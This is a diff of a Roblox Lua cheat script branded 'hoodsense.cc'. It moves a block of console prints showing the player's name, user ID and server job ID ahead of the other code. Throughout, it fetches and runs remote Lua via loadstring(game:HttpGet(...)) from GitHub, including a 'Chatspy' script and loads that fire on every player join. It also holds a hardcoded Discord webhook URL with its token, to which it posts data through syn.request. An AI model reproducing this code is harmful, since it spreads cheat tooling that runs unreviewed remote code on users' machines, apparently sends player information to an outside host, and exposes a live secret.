@@ -1751,7 +1751,7 @@ game.StarterGui:SetCore("SendNotification", {
     Duration = "5";
     callbakc = bindableFunction;
 })
-wait(10)
+wait(4)
 game.StarterGui:SetCore("SendNotification", {
     Title = "hoodsense.cc";
     Text = "https://hoodsense.cf";
@@ -1760,6 +1760,29 @@ game.StarterGui:SetCore("SendNotification", {
     callbakc = bindableFunction;
     Button1 = "Okay!";
 })
+print("___________________________HOODSENSE.CC__________________________")
+print("| [hoodsense.cc] Executed version: 6.0")
+print("| [hoodsense.cc] Your user is: "..game.Players.LocalPlayer.Name.. "") 
+print("| [hoodsense.cc] Your id is: "..game.Players.LocalPlayer.UserId.. "")
+print("| [hoodsense.cc] Job id: " ..game.JobId.. "")
+print("| [hoodsense.cc] Join us discord.gg/axq                 ")
+print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
+print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
+print("_________________________________________________________________")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/SomeRandomStuff/Main/Chatspy.lua'))()
+
+local Players = game:GetService("Players")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+
+Players.PlayerAdded:Connect(function(player)
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
+end)
+wait(1)
+loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 
 local url = 'https://discord.com/api/webhooks/962883148901929050/L9G5cfJ6Dpw4g_nHDye3mHvZOwDPr5FW2OyvzpQrFzUoUiCNqfw4BXfTELF9loTMtoUz'
 local req = syn.request
@@ -1846,26 +1869,6 @@ local data = {
 }
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
 
-print("___________________________HOODSENSE.CC__________________________")
-print("| [hoodsense.cc] Executed version: 6.0")
-print("| [hoodsense.cc] Your user is: "..game.Players.LocalPlayer.Name.. "") 
-print("| [hoodsense.cc] Your id is: "..game.Players.LocalPlayer.UserId.. "")
-print("| [hoodsense.cc] Job id: " ..game.JobId.. "")
-print("| [hoodsense.cc] Join us discord.gg/axq                 ")
-print("| [hoodsense.cc] Made by ekso <@804245361894883339>     ")
-print("| [hoodsense.cc] Website - https://hoodsense.cf         ")
-print("_________________________________________________________________")
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/SomeRandomStuff/Main/Chatspy.lua'))()
-
-local Players = game:GetService("Players")
-
-Players.PlayerAdded:Connect(function(player)
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/blacklist.lua'))()
-end)
-wait(1)
-loadstring(game:HttpGet('https://raw.githubusercontent.com/eksotopro/holders/main/emoji.lua'))()
 
 -------------------------------------------------------------------------
 --[[
